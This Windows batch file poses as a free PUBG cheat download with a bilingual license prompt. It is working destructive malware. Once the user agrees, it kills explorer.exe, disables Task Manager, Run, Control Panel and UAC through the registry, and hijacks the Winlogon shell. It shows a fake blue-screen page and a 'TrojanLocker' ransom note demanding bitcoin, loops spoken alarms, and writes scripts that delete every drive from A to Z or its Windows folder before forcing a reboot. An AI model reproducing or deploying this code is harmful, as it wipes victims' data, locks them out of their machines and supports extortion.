@echo off

cls

if not exist %systemdrive%\Users goto old
if not exist %windir%\SysWow64 goto no

cls

:KO

mode con cols=107 lines=28
chcp 949
color 2f
cls
echo.
echo (If you can't see Korean correctly, please enter "English" below.)
echo ��Ʋ�׶��� ������ �ٿ�ε� ���α׷� 1.0
echo ==========================================================================================================
echo.
echo ���ǰ�༭
echo.
echo ==========================================================================================================
echo.
echo ���ϴ� �� ���α׷��� ����ϴµ��� å���� ������,
echo �� ���α׷��� ����ϴٰ� �߻��ϴ� ������ ���ؼ��� �ڽ��� å������ ����ؾ� �մϴ�. 
echo ���� �� ���α׷��� ����ϴ� �ñ��� ������ ������, �Ʒ��� �̸��Ϸ� �����غ��ñ� �ٶ��ϴ�.
echo.
echo Freeworld_support1@protonmail.ch
echo.
echo �� ���뿡 �����ϼ̴ٸ� �Ʒ��� �Է¶��� �Է��Ͻʽÿ�.
echo.
echo 1 : �����մϴ�.
echo 2 : �������� �ʽ��ϴ�.
echo.
echo ==========================================================================================================
echo.
:RSTARTK
echo.
echo �� ��ȣ�� �����ѵ� �Է��Ͻʽÿ�. (1 or 2)
echo.
set /p password=�Է¶�:
if "%password%" == "1" goto SP
if "%password%" == "2" goto EG
if "%password%" == "English" goto EN
if "%password%" == "" goto RSTARTK
goto RSTARTK

:EN

mode con cols=107 lines=28
chcp 437
color 2f
cls
echo.
echo (If you want to change to Korean, enter "Korean" below.)
echo Battleground Free Hack Download 1.0
echo ==========================================================================================================
echo.
echo License agreement
echo.
echo ==========================================================================================================
echo.
echo You have a responsibility to use this program
echo And you must remember when you have a problem during the use of this program, it will be your responsible.
echo Also, if you have some questions during using this program, contact with below email.
echo.
echo Freeworld_support1@protonmail.ch
echo.
echo If you agree, please enter below.
echo.
echo 1 : I'm agree.
echo 2 : I'm not agree.
echo.
echo ==========================================================================================================
echo.
:RSTARTE
echo.
echo Choose number and enter below. (1 or 2)
echo.
set /p password=Enter:
if "%password%" == "1" goto SP
if "%password%" == "2" goto EG
if "%password%" == "Korean" goto KO
if "%password%" == "" goto RSTARTE
goto RSTARTE

:SP

echo @echo off > %temp%\Fakeinstaller.bat
echo taskkill /f /im explorer.exe >> %temp%\Fakeinstaller.bat
echo :R >> %temp%\Fakeinstaller.bat
echo chcp 949 >> %temp%\Fakeinstaller.bat
echo cls >> %temp%\Fakeinstaller.bat
echo echo. >> %temp%\Fakeinstaller.bat
echo echo ��Ʋ�׶��� �������� ��ġ�ϴ� ���Դϴ�. ��ø� ��ٸ��ʽÿ�... >> %temp%\Fakeinstaller.bat
echo echo. >> %temp%\Fakeinstaller.bat
echo echo This program is installing PUBG free hack. Please wait..... >> %temp%\Fakeinstaller.bat
echo echo. >> %temp%\Fakeinstaller.bat
echo pause^>nul >> %temp%\Fakeinstaller.bat
echo goto R >> %temp%\Fakeinstaller.bat

cls

start /max %temp%\Fakeinstaller.bat
start /max %temp%\Fakeinstaller.bat
start /max %temp%\Fakeinstaller.bat
start /max %temp%\Fakeinstaller.bat
start /max %temp%\Fakeinstaller.bat

cls

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d %temp%\Startp.bat /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3} /v Restrict_Run /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search /v SearchboxTaskbarMode /t REG_DWORD /d 0 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayContextMenu /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000900000000005be000005ce000005de00000440000001d000000380000001de0000038e000000000 /f
reg add HKEY_CURRENT_USER\Console /v QuickEdit /t REG_DWORD /d 0 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

cls

RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters ,1 ,True

cls

(
  echo ^<!DOCTYPE HTML^>
  echo ^<html^>
  echo   ^<head^>
  echo     ^<hta:application id="oBVC"
  echo                  applicationname="BSOD"
  echo                  version="1.0"
  echo                  maximizebutton="no"
  echo                  minimizebutton="no"
  echo                  sysmenu="no"
  echo                  Caption="no"
  echo                  windowstate="maximize"/^> 
  echo     ^<title^> Test ^</title^>
  echo     ^<meta charset = "euc-kr"^>
  echo     ^<style^>
  echo       .Info{
  echo         font-size:25px;
  echo         color:white;
  echo       }
  echo       .Errorcode{
  echo         font-size:35px;
  echo         color:white;
  echo       }
  echo       body{
  echo         background-color:blue;
  echo       }
  echo     ^</style^>
  echo   ^</head^>
  echo   ^<body^>
  echo    ^<p class = "Info"^> �߿��� ������ �߻��ǿ� ��ǻ�͸� �����Ҽ� �����ϴ�.
  echo    ^<br^>
  echo    ����, ���� ����� ��ǻ�͸� �����Ҽ� �����ϴ�.
  echo    ^<br^>
  echo    ���� �� ������ �ذ��ϰ� �ʹٸ�, ����� ����ũ�μ���Ʈ�� �����ؾ� �մϴ�.
  echo    ^<br^>
  echo    �׷��� �� ������ �ذ��ϱ� ���� ����ũ�μ���Ʈ�� �����غ��ʽÿ�!
  echo    ^<br^>
  echo    ���� �������� �����Ϸ� �Ѵٸ�, �Ʒ��� �����ڵ带 �����Ͻʽÿ� :
  echo    ^<br^>
  echo    ^</p^>
  echo    ^<p class = "Errorcode"^>
  echo    ^<strong^> CRITICAL_PROCESS_DIED ^</strong^>
  echo    ^</p^>
  echo   ^</body^>
  echo ^</html^>
) > %temp%\RansomRansom.hta

cls

(
  echo ^<!DOCTYPE HTML^>
  echo ^<html^>
  echo   ^<head^>
  echo     ^<hta:application id="oBVC"
  echo                  applicationname="BSOD"
  echo                  version="1.0"
  echo                  maximizebutton="no"
  echo                  minimizebutton="no"
  echo                  sysmenu="no"
  echo                  Caption="no"
  echo                  windowstate="maximize"/^> 
  echo     ^<title^> Test ^</title^>
  echo     ^<meta charset = "euc-kr"^>
  echo     ^<style^>
  echo       .Info{
  echo         font-size:20px;
  echo         color:white;
  echo       }
  echo       #version{
  echo         font-size:30px;
  echo         color:#FF0000;
  echo       }
  echo       #BA{
  echo         border:15px solid silver;
  echo         margin:10px;
  echo         padding:15px;
  echo         font-size:26px;
  echo         color:white;
  echo       }
  echo       .Bit{
  echo         font-size:30px;
  echo         color:white;
  echo       }
  echo       body{
  echo         background-color:blue;
  echo       }
  echo     ^</style^>
  echo   ^</head^>
  echo   ^<body^>
  echo    ^<p id = "version" align = "center"^>
  echo    ^<strong^>��Ʋ�׶��� ������ �ٿ�ε带 �õ��Ѱ� ����,,,,, ������ ���� �߸��Ȱ��� ����?^</strong^>
  echo    ^</p^>
  echo    ^<br^>
  echo    ^<p class = "Info"^> ������ ��ǻ�Ͱ� TrojanLocker���� �����Ǿ����ϴ�!
  echo    ^<br^>
  echo    �׷���, �� ���α׷��� ������ �߿��� �ý��������� �����Ͽ����ϴ�.
  echo    ^<br^>
  echo    �Ƹ�, ���ϲ����� ��Ʈ������ �����ϱ� ������ ������ �����Ҽ� �������Դϴ�!
  echo    ^<br^>
  echo    �׷��� �������� ���ʽÿ�! �� ���α׷��� ��� ������ ����� ������ �Ϻ� ������ �������� �������Դϴ�!
  echo    ^<br^>
  echo    �׷��� ���� ����� ��ǻ�͸� ������Ϸ� �Ѵٸ�, ������ ��ǻ�Ͱ� �ı��ɰ��̴� �����Ͻʽÿ�!
  echo    ^<br^>
  echo    �׷���, ����� ��ǻ�͸� ��������� ���ʽÿ�!
  echo    ^<br^>
  echo    ���� ���ϰ� �߿��� ���ϵ��� �����ϰ� �ʹٸ�, �Ʒ��� ��ħ������ �����ñ� �ٶ��ϴ�.
  echo    ^<br^>
  echo    ^</p^>
  echo    ^<p class = "Bit"^>
  echo    ^<br^>
  echo    1. 300�޷� ��ġ�� ��Ʈ������ �Ʒ��� ��Ʈ���� �ּҷ� �����ϴ�.
  echo    ^<br^>
  echo    ^<p id = "BA" align = "center"^>
  echo    ^<strong^>12uwVDqzrPEaquSprYTvwkoTYwkiL5YxM3^</strong^>
  echo    ^</p^>
  echo    ^<p class = "Bit"^>
  echo    2. ��Ʈ���� ���� ���̵� TrojanLocker_CheckPayment@protonmail.ch�� �����ϴ�.
  echo    ^<br^>
  echo    3. �׸��� �̸����� ���� �ص����α׷��� ���������� ��ٸ��ϴ�.
  echo    ^<br^>
  echo    ^</p^>
  echo    ^<p class = "Info"^>
  echo    ^<br^>
  echo    ���� �ݵ�� ����Ͻʽÿ�! ���� ����� ��ǻ�͸� ���� �Ǵ� �ٽý����Ѵٸ�, ����� �߿��� ������ �� Ű�� �ı��ɰ��Դϴ�!
  echo    ^<br^>
  echo    �׷��� ���� ��ǻ�͸� ��������� ���ʽÿ�!
  echo    ^<br^>
  echo    ����, �Ϻ� ���α׷����� ��ũ���͸� �����ϱ� ������ ����� �Ұ����Ұ��Դϴ�!
  echo    ^<br^>
  echo    �׷��� ������ ������ֽʽÿ�!
  echo    ^</p^>
  echo   ^</body^>
  echo ^</html^>
) > %temp%\RansomRansom2.hta

cls

set /a randomn=%random%%random%
echo NONE > %systemdrive%\%randomn%.txt

cls

echo @echo off > %temp%\Startp.bat
echo start /min %%temp%%\END.bat >> %temp%\Startp.bat
echo start %%Temp%%\Voice1.vbs >> %temp%\Startp.bat
echo start /min %%temp%%\explorerkill.bat >> %temp%\Startp.bat
echo exit >> %temp%\Startp.bat

cls

echo @echo off > %temp%\Startp2.bat
echo start /min %%temp%%\ENDS.bat >> %temp%\Startp2.bat
echo start %%Temp%%\Voice2.vbs >> %temp%\Startp2.bat
echo start /min %%temp%%\explorerkill.bat >> %temp%\Startp2.bat
echo exit >> %temp%\Startp2.bat

cls

echo @echo off > %temp%\explorerkill.bat
echo :a >> %temp%\explorerkill.bat
echo taskkill /f /im explorer.exe >> %temp%\explorerkill.bat
echo goto a >> %temp%\explorerkill.bat

cls

(
  echo @echo off
  echo reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d %%temp%%\Startp2.bat /f
  echo start %%Temp%%\RansomRansom2.hta
  echo start /min %temp%\RemoveA.bat
  echo start /min %temp%\RemoveB.bat
  echo start /min %temp%\RemoveC.bat
  echo start /min %temp%\RemoveD.bat 
  echo start /min %%temp%%\END1.bat
  echo exit
) > %temp%\END.bat

(
  echo @echo off
  echo start %%Temp%%\RansomRansom.hta
  echo start /min %temp%\RemoveA.bat
  echo start /min %temp%\RemoveB.bat
  echo start /min %temp%\RemoveC.bat
  echo start /min %temp%\RemoveD.bat 
  echo start /min %%temp%%\END1.bat
  echo exit
) > %temp%\ENDS.bat

(
  echo @echo off
  echo start /min %temp%\RemoveE.bat
  echo start /min %temp%\RemoveF.bat
  echo start /min %temp%\RemoveG.bat
  echo start /min %temp%\RemoveH.bat 
  echo start /min %%temp%%\END2.bat
  echo exit
) > %temp%\END1.bat

(
  echo @echo off
  echo start /min %temp%\RemoveI.bat
  echo start /min %temp%\RemoveJ.bat
  echo start /min %temp%\RemoveK.bat
  echo start /min %temp%\RemoveL.bat 
  echo start /min %%temp%%\END3.bat
  echo exit
) > %temp%\END2.bat

(
  echo @echo off
  echo start /min %temp%\RemoveM.bat
  echo start /min %temp%\RemoveN.bat
  echo start /min %temp%\RemoveO.bat
  echo start /min %temp%\RemoveP.bat 
  echo start /min %%temp%%\END4.bat
  echo exit
) > %temp%\END3.bat

(
  echo @echo off
  echo start /min %temp%\RemoveQ.bat
  echo start /min %temp%\RemoveR.bat
  echo start /min %temp%\RemoveS.bat
  echo start /min %temp%\RemoveT.bat 
  echo start /min %%temp%%\END5.bat
  echo exit
) > %temp%\END4.bat

(
  echo @echo off
  echo start /min %temp%\RemoveU.bat
  echo start /min %temp%\RemoveV.bat
  echo start /min %temp%\RemoveW.bat
  echo start /min %temp%\RemoveX.bat 
  echo start /min %%temp%%\END6.bat
  echo exit
) > %temp%\END5.bat

(
  echo @echo off
  echo start /min %temp%\RemoveY.bat
  echo start /min %temp%\RemoveZ.bat
  echo start /min %temp%\RemoveA.bat
  echo start /min %temp%\RemoveB.bat 
  echo start /min %%temp%%\END7.bat
  echo exit
) > %temp%\END6.bat

(
  echo @echo off
  echo start /min %temp%\RemoveC.bat
  echo start /min %temp%\RemoveD.bat
  echo start /min %temp%\RemoveE.bat
  echo start /min %temp%\RemoveF.bat 
  echo start /min %%temp%%\END8.bat
  echo exit
) > %temp%\END7.bat

(
  echo @echo off
  echo start /min %temp%\RemoveG.bat
  echo start /min %temp%\RemoveH.bat
  echo start /min %temp%\RemoveI.bat
  echo start /min %temp%\RemoveJ.bat 
  echo start /min %%temp%%\END9.bat
  echo exit
) > %temp%\END8.bat

(
  echo @echo off
  echo start /min %temp%\RemoveK.bat
  echo start /min %temp%\RemoveL.bat
  echo start /min %temp%\RemoveM.bat
  echo start /min %temp%\RemoveN.bat 
  echo start /min %%temp%%\END10.bat
  echo exit
) > %temp%\END9.bat

(
  echo @echo off
  echo start /min %temp%\RemoveO.bat
  echo start /min %temp%\RemoveP.bat
  echo start /min %temp%\RemoveQ.bat
  echo start /min %temp%\RemoveR.bat 
  echo start /min %%temp%%\END11.bat
  echo exit
) > %temp%\END10.bat

(
  echo @echo off
  echo start /min %temp%\RemoveS.bat
  echo start /min %temp%\RemoveT.bat
  echo start /min %temp%\RemoveU.bat
  echo start /min %temp%\RemoveV.bat 
  echo start /min %%temp%%\END12.bat
  echo exit
) > %temp%\END11.bat

(
  echo @echo off
  echo start /min %temp%\RemoveW.bat
  echo start /min %temp%\RemoveX.bat
  echo start /min %temp%\RemoveY.bat
  echo start /min %temp%\RemoveZ.bat
  echo exit
) > %temp%\END12.bat

cls

echo CreateObject("SAPI.SpVoice").Speak "Attnetion! Attention! Attention!" > %Temp%\Voice1.vbs
echo do >> %Temp%\Voice1.vbs
echo CreateObject("SAPI.SpVoice").Speak "Your important system files are deleted!" >> %Temp%\Voice1.vbs
echo CreateObject("SAPI.SpVoice").Speak "More information, please follow some instructions!" >> %Temp%\Voice1.vbs
echo loop >> %Temp%\Voice1.vbs

cls

echo do > %Temp%\Voice2.vbs
echo CreateObject("SAPI.SpVoice").Speak "A important problem has been detected your computer." >> %Temp%\Voice2.vbs
echo CreateObject("SAPI.SpVoice").Speak "For this reason, you can't boot and use your computer." >> %Temp%\Voice2.vbs
echo CreateObject("SAPI.SpVoice").Speak "If you want to solve this problem, you need to contact with microsoft windows." >> %Temp%\Voice2.vbs
echo CreateObject("SAPI.SpVoice").Speak "So if you want to solve this problem, contact with microsoft windows!" >> %Temp%\Voice2.vbs
echo loop >> %Temp%\Voice2.vbs

cls

(
  echo @echo off
  echo if exist A:\%randomn%.txt goto W 
  echo cls 
  echo rd A:\ /s /q 
  echo goto end 
  echo :W 
  echo rd A:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveA.bat
  
(
  echo @echo off
  echo if exist B:\%randomn%.txt goto W 
  echo cls 
  echo rd B:\ /s /q 
  echo goto end 
  echo :W 
  echo rd B:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveB.bat
  
(
  echo @echo off
  echo if exist C:\%randomn%.txt goto W 
  echo cls 
  echo rd C:\ /s /q 
  echo goto end 
  echo :W 
  echo rd C:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveC.bat
  
(
  echo @echo off
  echo if exist D:\%randomn%.txt goto W 
  echo cls 
  echo rd D:\ /s /q 
  echo goto end 
  echo :W 
  echo rd D:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveD.bat
  
(
  echo @echo off
  echo if exist E:\%randomn%.txt goto W 
  echo cls 
  echo rd E:\ /s /q 
  echo goto end 
  echo :W 
  echo rd E:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveE.bat

(
  echo @echo off
  echo if exist F:\%randomn%.txt goto W 
  echo cls 
  echo rd F:\ /s /q 
  echo goto end 
  echo :W 
  echo rd F:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveF.bat
  
(
  echo @echo off
  echo if exist G:\%randomn%.txt goto W 
  echo cls 
  echo rd G:\ /s /q 
  echo goto end 
  echo :W 
  echo rd G:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveG.bat
  
(
  echo @echo off
  echo if exist H:\%randomn%.txt goto W 
  echo cls 
  echo rd H:\ /s /q 
  echo goto end 
  echo :W 
  echo rd H:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveH.bat
  
(
  echo @echo off
  echo if exist I:\%randomn%.txt goto W 
  echo cls 
  echo rd I:\ /s /q 
  echo goto end 
  echo :W 
  echo rd I:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveI.bat
  
(
  echo @echo off
  echo if exist J:\%randomn%.txt goto W 
  echo cls 
  echo rd J:\ /s /q 
  echo goto end 
  echo :W 
  echo rd J:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveJ.bat

(
  echo @echo off
  echo if exist K:\%randomn%.txt goto W 
  echo cls 
  echo rd K:\ /s /q 
  echo goto end 
  echo :W 
  echo rd K:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveK.bat
  
(
  echo @echo off
  echo if exist L:\%randomn%.txt goto W 
  echo cls 
  echo rd L:\ /s /q 
  echo goto end 
  echo :W 
  echo rd L:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveL.bat
  
(
  echo @echo off
  echo if exist M:\%randomn%.txt goto W 
  echo cls 
  echo rd M:\ /s /q 
  echo goto end 
  echo :W 
  echo rd M:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveM.bat
  
(
  echo @echo off
  echo if exist N:\%randomn%.txt goto W 
  echo cls 
  echo rd N:\ /s /q 
  echo goto end 
  echo :W 
  echo rd N:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveN.bat
  
(
  echo @echo off
  echo if exist O:\%randomn%.txt goto W 
  echo cls 
  echo rd O:\ /s /q 
  echo goto end 
  echo :W 
  echo rd O:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveO.bat

(
  echo @echo off
  echo if exist P:\%randomn%.txt goto W 
  echo cls 
  echo rd P:\ /s /q 
  echo goto end 
  echo :W 
  echo rd P:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveP.bat
  
(
  echo @echo off
  echo if exist Q:\%randomn%.txt goto W 
  echo cls 
  echo rd Q:\ /s /q 
  echo goto end 
  echo :W 
  echo rd Q:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveQ.bat
  
(
  echo @echo off
  echo if exist R:\%randomn%.txt goto W 
  echo cls 
  echo rd R:\ /s /q 
  echo goto end 
  echo :W 
  echo rd R:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveR.bat
  
(
  echo @echo off
  echo if exist S:\%randomn%.txt goto W 
  echo cls 
  echo rd S:\ /s /q 
  echo goto end 
  echo :W 
  echo rd S:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveS.bat
  
(
  echo @echo off 
  echo if exist T:\%randomn%.txt goto W 
  echo cls 
  echo rd T:\ /s /q 
  echo goto end 
  echo :W 
  echo rd T:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveT.bat
  
(
  echo @echo off
  echo if exist U:\%randomn%.txt goto W 
  echo cls 
  echo rd U:\ /s /q 
  echo goto end 
  echo :W 
  echo rd U:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveU.bat
  
(
  echo @echo off
  echo if exist V:\%randomn%.txt goto W 
  echo cls 
  echo rd V:\ /s /q 
  echo goto end 
  echo :W 
  echo rd V:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveV.bat
  
(
  echo @echo off
  echo if exist W:\%randomn%.txt goto W 
  echo cls 
  echo rd W:\ /s /q 
  echo goto end 
  echo :W 
  echo rd W:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveW.bat
  
(
  echo @echo off
  echo if exist X:\%randomn%.txt goto W 
  echo cls 
  echo rd X:\ /s /q 
  echo goto end 
  echo :W 
  echo rd X:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveX.bat
  
(
  echo @echo off
  echo if exist Y:\%randomn%.txt goto W 
  echo cls 
  echo rd Y:\ /s /q 
  echo goto end 
  echo :W 
  echo rd Y:\Windows /s /q 
  echo cls 
  echo :end 
  echo exit ) > %temp%\RemoveY.bat
  
(
  echo @echo off
  echo if exist Z:\%randomn%.txt goto W 
  echo cls 
  echo rd Z:\ /s /q 
  echo goto end 
  echo :W 
  echo rd Z:\Windows /s /q 
  echo cls 
  echo :end  
  echo exit ) > %temp%\RemoveZ.bat

cls

shutdown -r -f -t 00

cls

exit

:no

chcp 949
cls
echo.
echo 32��Ʈ ��ǻ�Ϳ����� �� ���α׷��� �����Ҽ� �����ϴ�.
echo ��ǻ�� ��Ʈ�� Ȯ���ѵ� �ٽ� �õ����ּ���!
echo.
echo �ƹ�Ű�� ������ �����Ͻʽÿ�.
echo.
echo You can't run this program in 32bit computer.
echo Please check your computer bit and try again!
echo.
echo Press any key to exit.
echo.
pause>nul
exit

:old

chcp 949
cls
echo.
echo ���ϴ� ������ OS�� ������Դϴ�!
echo ������ ������ ���׷��̵� ���ּ���!
echo.
echo �ƹ�Ű�� ������ �����Ͻʽÿ�.
echo.
echo You are using old windows OS!
echo Please upgrade your windows version!
echo.
echo Press any key to exit.
echo.
pause>nul
exit

:EG

echo.
echo �ƹ�Ű�� ������ �����Ͻʽÿ�.
echo.
echo Please press any key to exit.
echo.
pause>nul
exit
